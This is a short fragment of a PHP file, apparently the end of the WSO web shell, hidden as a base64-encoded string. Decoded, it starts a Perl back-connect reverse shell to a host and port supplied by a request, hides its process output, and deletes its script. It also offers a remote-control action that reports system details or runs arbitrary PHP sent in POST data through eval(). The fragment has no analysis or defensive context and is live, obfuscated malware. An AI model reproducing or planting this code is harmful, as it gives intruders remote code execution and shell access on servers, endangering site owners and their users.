ZWN0X3ApOwoJCQkkb3V0ID0gd3NvRXgoInBlcmwgL3RtcC9iYy5wbCAiLiRfUE9TVFsncDInXS4iICIuJF9QT1NUWydwMyddLiIgMT4vZGV2L251bGwgMj4mMSAmIik7CiAgICAgICAgICAgIHNsZWVwKDEpOwoJCQllY2hvICI8cHJlIGNsYXNzPW1sMT4kb3V0XG4iLndzb0V4KCJwcyBhdXggfCBncmVwIGJjLnBsIikuIjwvcHJlPiI7CiAgICAgICAgICAgIHVubGluaygiL3RtcC9iYy5wbCIpOwoJCX0KCX0KCWVjaG8gJzwvZGl2Pic7Cgl3c29Gb290ZXIoKTsKfQpmdW5jdGlvbiBhY3Rpb25SQygpIHsKCWlmKCFAJF9QT1NUWydwMSddKSB7CgkJJGEgPSBhcnJheSgKCQkJInVuYW1lIiA9PiBwaHBfdW5hbWUoKSwKCQkJInBocF92ZXJzaW9uIiA9PiBwaHB2ZXJzaW9uKCksCgkJCSJ3c29fdmVyc2lvbiIgPT4gV1NPX1ZFUlNJT04sCgkJCSJzYWZlbW9kZSIgPT4gQGluaV9nZXQoJ3NhZmVfbW9kZScpCgkJKTsKCQllY2hvIHNlcmlhbGl6ZSgkYSk7Cgl9IGVsc2UgewoJCWV2YWwoJF9QT1NUWydwMSddKTsKCX0KfQppZiggZW1wdHkoJF9QT1NUWydhJ10pICkKCWlmKGlzc2V0KCRkZWZhdWx0X2FjdGlvbikgJiYgZnVuY3Rpb25fZXhpc3RzKCdhY3Rpb24nIC4gJGRlZmF1bHRfYWN0aW9uKSkKCQkkX1BPU1RbJ2EnXSA9ICRkZWZhdWx0X2FjdGlvbjsKCWVsc2UKCQkkX1BPU1RbJ2EnXSA9ICdTZWNJbmZvJzsKaWYoICFlbXB0eSgkX1BPU1RbJ2EnXSkgJiYgZnVuY3Rpb25fZXhpc3RzKCdhY3Rpb24nIC4gJF9QT1NUWydhJ10pICkKCWNhbGxfdXNlcl9mdW5jKCdhY3Rpb24nIC4gJF9QT1NUWydhJ10pOwpleGl0Owo="));


?>

